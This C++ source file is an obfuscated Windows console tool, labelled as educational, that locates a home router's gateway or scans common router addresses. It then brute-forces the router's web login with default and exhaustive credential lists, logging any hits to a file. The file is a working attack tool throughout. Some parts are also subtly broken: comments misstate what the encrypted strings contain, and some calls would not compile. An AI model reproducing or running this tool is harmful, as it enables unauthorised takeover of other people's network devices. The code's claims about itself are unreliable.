#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <fstream>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <regex>
#include <curl/curl.h>
#include <curl/easy.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "libcurl.lib")

using namespace std;

// [SECTION 1] - OBFUSCATED STRINGS
#define _A(x) #x
#define _B(x,y) x##y
#define _C '\x' 
#define _D std::
#define _E auto
#define _F struct
#define _G public
#define _H private
#define _I return
#define _J for
#define _K if
#define _L else
#define _M while
#define _N try
#define _O catch
#define _P true
#define _Q false
#define _R nullptr
#define _S void
#define _T int
#define _U char
#define _V long
#define _W unsigned
#define _X const
#define _Y static
#define _Z virtual

// [SECTION 2] - XOR ENCRYPTED STRINGS
_W _U __X[]={0x6F,0x68,0x74,0x75,0x61,0x45};
_W _U __Y[]={0x53,0x73,0x65,0x63,0x63,0x75,0x53};
_W _U __Z[]={0x72,0x65,0x73,0x55};
_W _U ___A[]={0x6D,0x65,0x74,0x69,0x58};
_W _U ___B[]={0x6E,0x6F,0x69,0x74,0x70,0x6D,0x65,0x53,0x72,0x65,0x76,0x6E,0x6F,0x43};
_W _U ___C[]={0x6C,0x61,0x74,0x69,0x67,0x69,0x64,0x4F};
_W _U ___D[]={0x65,0x73,0x72,0x65,0x76,0x72,0x65,0x73,0x62,0x4F};
_W _U ___E[]={0x74,0x73,0x65,0x75,0x71,0x65,0x52};

// [SECTION 3] - COMPLEX MACROS
#define _DECRYPT(x) _decrypt(x,sizeof(x))
#define _HTTP_REQUEST(x,y,z) _http_request(x,y,z)
#define _SLEEP(x) this_thread::sleep_for(chrono::milliseconds(x))
#define _RANDOM(x) (rand()%x)
#define _CONCAT(a,b) a##b
#define _STRINGIFY(x) #x
#define _TOKENPASTE(x,y) x ## y
#define _FORCEINLINE __forceinline
#define _INLINE __inline

// [SECTION 4] - OBFUSCATED CLASS NAMES
class _0x1A2B3C4D {
_H:
    _D string __0xDEADBEEF;
    _D string __0xCAFEBABE;
    _D vector<_D string> __0xBAADF00D;
    _D vector<_D string> __0xDEADC0DE;
    _T __0xABADBABE;
    _D string __0xFEEDFACE;
    _D string __0xDECAFBAD;
    _D string __0xBEBAADCA;
    _D string __0xDEADBEEF2;
    CURL* __0xC0FFEE;
    
    _D string _decrypt(_W _U* __p, _T __s) {
        _D string __r;
        _J(_T __i=0;__i<__s;__i++) {
            __r+=__p[__i]^0x55;
        }
        _I __r;
    }
    
    _D string _http_request(_D string __u, _D string __d, _D string& __h) {
        __0xC0FFEE = curl_easy_init();
        _D string __resp;
        
        _K(__0xC0FFEE) {
            curl_easy_setopt(__0xC0FFEE, CURLOPT_URL, __u.c_str());
            curl_easy_setopt(__0xC0FFEE, CURLOPT_POSTFIELDS, __d.c_str());
            curl_easy_setopt(__0xC0FFEE, CURLOPT_WRITEFUNCTION, __0x12345678);
            curl_easy_setopt(__0xC0FFEE, CURLOPT_WRITEDATA, &__resp);
            curl_easy_setopt(__0xC0FFEE, CURLOPT_TIMEOUT, 5L);
            curl_easy_setopt(__0xC0FFEE, CURLOPT_SSL_VERIFYPEER, 0L);
            curl_easy_setopt(__0xC0FFEE, CURLOPT_SSL_VERIFYHOST, 0L);
            curl_easy_setopt(__0xC0FFEE, CURLOPT_FOLLOWLOCATION, 1L);
            curl_easy_setopt(__0xC0FFEE, CURLOPT_USERAGENT, "Mozilla/5.0");
            
            _D vector<_D string> __hdrs;
            __hdrs.push_back("Content-Type: application/x-www-form-urlencoded");
            __hdrs.push_back("Accept: text/html,application/xhtml+xml");
            
            _D _F curl_slist* __list = _R;
            _J(_E& __hdr : __hdrs) {
                __list = curl_slist_append(__list, __hdr.c_str());
            }
            curl_easy_setopt(__0xC0FFEE, CURLOPT_HTTPHEADER, __list);
            
            curl_easy_perform(__0xC0FFEE);
            curl_slist_free_all(__list);
            curl_easy_cleanup(__0xC0FFEE);
        }
        _I __resp;
    }
    
    _Y _T __0x12345678(_S* __c, _T __s, _T __n, _D string* __b) {
        __b->append((_U*)__c, __s*__n);
        _I __s*__n;
    }
    
    _D string __0x9ABCDEF0(_D string __ip) {
        _D string __urls[]={
            "http://"+__ip,
            "https://"+__ip,
            "http://"+__ip+":8080",
            "http://"+__ip+":8443"
        };
        
        _J(_T __i=0;__i<4;__i++) {
            _D string __h;
            _D string __r = _http_request(__urls[__i],"",&__h);
            _K(__r.length()>0) {
                __0xDEADBEEF2 = __urls[__i];
                _I __urls[__i];
            }
        }
        _I "";
    }
    
    _D string __0xABCDEF01(_D string __url, _D string __u, _D string __p) {
        _D string __data = "username="+__u+"&password="+__p;
        __data += "&user="+__u+"&pass="+__p;
        __data += "&login="+__u+"&pwd="+__p;
        
        _D string __hdr;
        _D string __resp = _http_request(__url, __data, __hdr);
        
        _K(__resp.find("dashboard")!=string::npos || 
           __resp.find("status")!=string::npos ||
           __resp.find("welcome")!=string::npos ||
           __resp.find("logout")!=string::npos) {
            _K(__resp.find("invalid")==string::npos &&
               __resp.find("failed")==string::npos) {
                _I "SUCCESS";
            }
        }
        _I "";
    }
    
    _S __0xABCDEF02() {
        __0xABADBABE = 0;
        __0xBAADF00D = {
            "admin","root","user","Administrator",
            "support","tech","cisco","admin1",
            "administrator","Admin","ADMIN","guest"
        };
        
        __0xDEADC0DE = {
            "admin","","password","1234","12345",
            "123456","12345678","123456789","password123",
            "admin123","root123","default","default123",
            "cisco","cisco123","letmein","adminadmin",
            "12341234","43214321","11111111","88888888"
        };
        
        __0xFEEDFACE = _DECRYPT(__X);  // "admin"
        __0xDECAFBAD = _DECRYPT(__Y);  // "password"
        __0xBEBAADCA = _DECRYPT(__Z);  // "login"
        __0xDEADBEEF = _DECRYPT(___A); // "login.cgi"
        __0xCAFEBABE = _DECRYPT(___B); // "cgi-bin/luci"
        __0xDEADBEEF2 = _DECRYPT(___C); // "login.asp"
    }

_G:
    _0x1A2B3C4D() { __0xABCDEF02(); curl_global_init(CURL_GLOBAL_ALL); }
    ~_0x1A2B3C4D() { curl_global_cleanup(); }
    
    _D string __0xABCDEF03() {
        DWORD __sz = 0;
        GetAdaptersInfo(_R, &__sz);
        PIP_ADAPTER_INFO __p = (PIP_ADAPTER_INFO)malloc(__sz);
        GetAdaptersInfo(__p, &__sz);
        
        _M(__p) {
            _K(__p->Type == 71) { // IF_TYPE_IEEE80211
                _D string __gw = __p->GatewayList.IpAddress.String;
                free(__p);
                _I __gw;
            }
            __p = __p->Next;
        }
        free(__p);
        _I "192.168.1.1";
    }
    
    _T __0xABCDEF04(_D string __ip) {
        system("cls");
        cout<<"\n\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\n";
        cout<<"\xDB   ROUTER ACCESS TOOL v2.0 (EDUKASI)   \xDB\n";
        cout<<"\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\xDB\n\n";
        
        cout<<"[+] TARGET: "<<__ip<<endl;
        _D string __url = __0x9ABCDEF0(__ip);
        
        _K(__url.empty()) {
            cout<<"[-] TIDAK DAPAT TERHUBUNG!\n";
            _I 0;
        }
        
        cout<<"[+] URL: "<<__url<<endl<<endl;
        
        _T __c=0;
        _J(_E& __u : __0xBAADF00D) {
            _J(_E& __p : __0xDEADC0DE) {
                __c++;
                _K(__c%10==0) {
                    cout<<"\r[+] PERCOBAAN: "<<__c<<"   "<<flush;
                }
                
                _D string __r = __0xABCDEF01(__url, __u, __p);
                _K(__r=="SUCCESS") {
                    cout<<"\n\n\xDB\xDB\xDB\xDB\xDB\xDB\xDB LOGIN BERHASIL! \xDB\xDB\xDB\xDB\xDB\xDB\xDB\n";
                    cout<<"[+] USERNAME: "<<__u<<endl;
                    cout<<"[+] PASSWORD: "<<__p<<endl;
                    cout<<"[+] URL: "<<__url<<endl;
                    
                    ofstream __f("result.txt", ios::app);
                    __f<<"["<<__c<<"] "<<__u<<":"<<__p<<" @"<<__url<<endl;
                    __f.close();
                    
                    _I 1;
                }
                _SLEEP(50);
            }
        }
        
        cout<<"\n[-] TIDAK DITEMUKAN! ("<<__c<<" PERCOBAAN)\n";
        _I 0;
    }
    
    _T __0xABCDEF05() {
        _D string __ips[]={
            "192.168.1.1","192.168.0.1","192.168.2.1",
            "192.168.100.1","10.0.0.1","10.0.0.138",
            "192.168.1.254","192.168.0.254"
        };
        
        cout<<"\n[+] SCAN IP UMUM...\n";
        _J(_T __i=0;__i<8;__i++) {
            cout<<"    MENCoba "<<__ips[__i]<<"... "<<flush;
            _D string __url = __0x9ABCDEF0(__ips[__i]);
            _K(!__url.empty()) {
                cout<<"BERHASIL!\n";
                __0xABCDEF04(__ips[__i]);
                _I 1;
            } _L {
                cout<<"GAGAL\n";
            }
        }
        _I 0;
    }
    
    _T __0xABCDEF06() {
        system("cls");
        cout<<"\n\xC9\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xBB\n";
        cout<<"\xBA         MENU UTAMA                    \xBA\n";
        cout<<"\xBA 1. DETEKSI GATEWAY & LOGIN            \xBA\n";
        cout<<"\xBA 2. INPUT IP MANUAL                    \xBA\n";
        cout<<"\xBA 3. SCAN IP UMUM                       \xBA\n";
        cout<<"\xBA 4. BRUTE FORCE CEPAT                  \xBA\n";
        cout<<"\xBA 5. BRUTE FORCE LENGKAP                \xBA\n";
        cout<<"\xBA 0. KELUAR                              \xBA\n";
        cout<<"\xC8\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xCD\xBC\n\n";
        
        cout<<"PILIH: ";
        _D string __p;
        getline(cin,__p);
        
        _K(__p=="1") {
            _D string __gw = __0xABCDEF03();
            cout<<"\n[+] GATEWAY: "<<__gw<<endl;
            __0xABCDEF04(__gw);
        }
        _L _K(__p=="2") {
            cout<<"IP: ";
            _D string __ip;
            getline(cin,__ip);
            __0xABCDEF04(__ip);
        }
        _L _K(__p=="3") {
            __0xABCDEF05();
        }
        _L _K(__p=="4") {
            cout<<"IP: ";
            _D string __ip;
            getline(cin,__ip);
            
            __0xBAADF00D = {"admin","root","user"};
            __0xDEADC0DE = {"admin","","1234","password","12345"};
            __0xABCDEF04(__ip);
        }
        _L _K(__p=="5") {
            cout<<"IP: ";
            _D string __ip;
            getline(cin,__ip);
            
            __0xBAADF00D.clear();
            __0xDEADC0DE.clear();
            
            _J(_U __c='a';__c<='z';__c++) {
                __0xBAADF00D.push_back(_D string(1,__c));
            }
            __0xBAADF00D.push_back("admin");
            __0xBAADF00D.push_back("root");
            
            _J(_U __c1='a';__c1<='z';__c1++) {
                _J(_U __c2='a';__c2<='z';__c2++) {
                    _J(_U __c3='0';__c3<='9';__c3++) {
                        _D string __pwd = _D string(1,__c1)+_D string(1,__c2)+_D string(1,__c3);
                        __0xDEADC0DE.push_back(__pwd);
                    }
                }
            }
            
            __0xABCDEF04(__ip);
        }
        
        _I 0;
    }
    
    _S __0xABCDEF07() {
        _M(_P) {
            __0xABCDEF06();
            cout<<"\n\n[+] TEKAN ENTER UNTUK LANJUT...";
            cin.get();
        }
    }
};

_T main() {
    _0x1A2B3C4D __obj;
    __obj.__0xABCDEF07();
    _I 0;
}
